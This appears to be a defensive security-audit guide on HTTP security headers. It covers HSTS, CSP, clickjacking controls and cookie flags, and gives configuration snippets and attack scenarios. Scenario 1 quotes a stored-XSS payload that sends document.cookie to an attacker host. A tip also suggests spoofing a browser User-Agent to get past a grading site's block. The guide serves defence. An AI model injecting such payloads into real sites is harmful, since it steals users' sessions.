# 01 — Security Headers

**Mapped OWASP:** A02:2025 (Security Misconfiguration), A05:2025 (Injection — mitigations).
**External references:**
- https://owasp.org/www-project-secure-headers/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
- https://content-security-policy.com/
- https://securityheaders.com/

## Description

HTTP response headers are the browser's instruction set for what scripts can run, what origins can frame the page, whether to trust the connection in the future, whether to treat MIME types loosely, and which referrer information to leak. The browser obeys these headers per-response, so missing one anywhere on the origin partially undoes the protection elsewhere. The current baseline for any auth-bearing site is the seven-header set evaluated by securityheaders.com — Strict-Transport-Security, Content-Security-Policy, CSP `frame-ancestors` (with `X-Frame-Options` as a legacy fallback), X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and properly-flagged session cookies. Anything less leaves measurable browser-level attack surface that no amount of backend hardening can close.

> **securityheaders.com caveat:** the grading site **403s generic / non-browser User-Agents**. When cross-checking via `curl`, spoof a browser `User-Agent`; if still blocked, grade directly from the live `curl -sI` response headers and mark the cross-check skipped.

These headers are runtime-only: a static scan of the source can find that `helmet()` is wired up, but only a live response confirms the headers actually emit on the deployed CDN / reverse-proxy / framework configuration.

## What to check

The expected-value + severity matrix is in SKILL.md Step 1's table; the points below are the finer details that table does not capture.

- `Strict-Transport-Security` present with `max-age` ≥ 1 year (`31536000`, the practical minimum); OWASP recommends `max-age=63072000` (2 years) with `preload`, and `includeSubDomains` on apex domains. Absence on an HTTPS site is **High** if auth runs there.
- `Content-Security-Policy` present and meaningful. Look for:
  - `default-src 'self'` (or stricter) and a non-`*` script-src.
  - **No `'unsafe-inline'` in `script-src`** — use nonces or hashes.
  - No `'unsafe-eval'` unless explicitly required (and document why).
  - `frame-ancestors` set (this is the primary clickjacking control).
- CSP `frame-ancestors` is the **primary** clickjacking defense; `X-Frame-Options: DENY` / `SAMEORIGIN` is a **legacy fallback** for old browsers. Prefer `frame-ancestors`; setting both is fine.
- `X-XSS-Protection` is **deprecated** — do not set it (or set it to `0`); modern protection comes from CSP, not this header.
- `Reporting-Endpoints` header (named by the CSP `report-to` directive) is the current mechanism for collecting CSP/violation reports — it supersedes the deprecated `Report-To` header, just as the CSP `report-to` directive supersedes the deprecated `report-uri` directive.
- `Permissions-Policy` present and non-empty (even a minimal `camera=(), microphone=(), geolocation=()` is meaningful).
- A securityheaders.com **grade ≥ B**. Grade is itself a finding when below B.

## How to fix

Pick the snippet matching the stack:

**Express / Node.js**
```js
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], frameAncestors: ["'none'"] } },
  strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

**Next.js** — `next.config.js` `headers()` async function returning the array. Or middleware that sets headers globally.

**Django** — `django.middleware.security.SecurityMiddleware` + `SECURE_HSTS_SECONDS = 63072000`, `SECURE_HSTS_INCLUDE_SUBDOMAINS = True`, `SECURE_HSTS_PRELOAD = True`, `SECURE_CONTENT_TYPE_NOSNIFF = True`, `SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'`. CSP via `django-csp`.

**FastAPI / Flask** — `secure` library, or hand-rolled middleware setting the headers. Both frameworks lack a built-in CSP.

**Nginx / Cloudflare / Vercel edge** — set headers at the edge if the app can't be modified. Vercel: `vercel.json` `headers` array. Cloudflare Workers / Transform Rules: HTTP Response Header Modification rules.

**Cookies** — set `Secure; HttpOnly; SameSite=Lax` on every session cookie. Cross-site embed auth needs `SameSite=None; Secure`.

Roll out CSP in **report-only mode** first (`Content-Security-Policy-Report-Only`) with a `report-uri` for a week, watch the reports, then promote to enforce mode. Going straight to enforce on a real app is how you take production down.

## Why it matters / attack scenario

**Scenario 1 — Stored XSS without CSP.** A comment field on the app stores `<script>fetch('//attacker.example/x?t='+document.cookie)</script>`. Without CSP, the browser runs it for every viewer. With `script-src 'self'` and a nonce-based policy, the inline script is blocked by the browser regardless of how it ended up in the DOM.

**Scenario 2 — Missing HSTS, café Wi-Fi.** A user on hotel Wi-Fi navigates to `example.com` (typed without scheme). The browser tries HTTP first. An attacker on the same Wi-Fi serves a forged HTTP response that redirects to a phishing clone. With HSTS preloaded (or remembered from a prior visit), the browser refuses to make the HTTP request and the attack fails before it starts.

**Scenario 3 — Clickjacking the admin panel.** An admin is logged in. An attacker hosts a page that iframes `https://app.example.com/admin/users/delete?id=42` and overlays an invisible "Click to claim prize" button on top. Without `X-Frame-Options` or `frame-ancestors`, the click hits the embedded admin button. Setting either header denies the embed.

**Scenario 4 — Mixed-content via missing HSTS.** App is HTTPS, but a `<script src="http://cdn.example.com/jquery.js">` slipped past review. Without HSTS the browser fetches the HTTP version; an on-path attacker substitutes the file. HSTS + `upgrade-insecure-requests` in CSP forces the browser to rewrite it to HTTPS.

## Mapped CWEs (selected)

- CWE-693 — Protection Mechanism Failure
- CWE-1021 — Improper Restriction of Rendered UI Layers or Frames (clickjacking)
- CWE-79 — Improper Neutralization of Input During Web Page Generation (XSS)
- CWE-319 — Cleartext Transmission of Sensitive Information
- CWE-614 — Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-1004 — Sensitive Cookie Without 'HttpOnly' Flag
- CWE-1275 — Sensitive Cookie with Improper SameSite Attribute
- CWE-942 — Permissive Cross-domain Policy with Untrusted Domains
- CWE-1173 — Improper Use of Validation Framework
- CWE-757 — Selection of Less-Secure Algorithm During Negotiation (cipher / TLS related)
